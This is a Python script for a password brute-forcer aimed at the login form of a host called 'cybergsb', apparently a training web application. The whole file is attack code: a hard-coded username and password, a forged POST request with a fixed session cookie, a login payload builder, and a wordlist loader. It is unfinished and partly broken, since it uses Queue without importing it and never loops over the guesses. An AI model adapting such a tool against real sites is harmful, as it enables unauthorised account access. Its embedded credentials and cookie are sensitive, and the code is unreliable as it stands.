import requests

class Bruteforcer() :
    def __init__(self, URL, wordlist):
        self.URL = URL
        self.wordlist = wordlist

    def getHTTPCode(self, requete):
        codeHTTP = requete.status_code
        print(codeHTTP)
        return codeHTTP

    def haveIBeenRedirected(self, requete):
        print(requete.history)
        self.getHTTPCode(requete)

    def authenticate(self):
        requeteHTTP = requests.get(self.URL, auth = ('lvillachane', 'jux7g'))
        self.haveIBeenRedirected(requeteHTTP)

    def setHeader(self, host):
        header = """POST /index.php?uc=connexion&action=valideConnexion HTTP/1.1
        Host: """ + host + """
        Content-Length: 33
        Cache-Control: max-age=0
        Upgrade-Insecure-Requests: 1
        Origin: http://""" + host + """
        Content-Type: application/x-www-form-urlencoded
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
        Referer: http://""" + host + """
        Accept-Encoding: gzip, deflate
        Accept-Language: fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7
        Cookie: PHPSESSID=qvaeretob5f41lf0iljckca0co
        Connection: close

        """
        return header

    def setPayload(self, username, password, host):
        header = self.setHeader(host)
        authRequest = "login=" + username + "&mdp=" + password
        payload = header + authRequest
        return payload

    def get_words(self):
        with open(self.wordlist) as f:
            raw_words = f.read()

        words = Queue()
        for word in raw_words.split():
            words.put(word)
        return words


brute = Bruteforcer('http://cybergsb/index.php', '../resources/passwords.txt')
brute.authenticate()
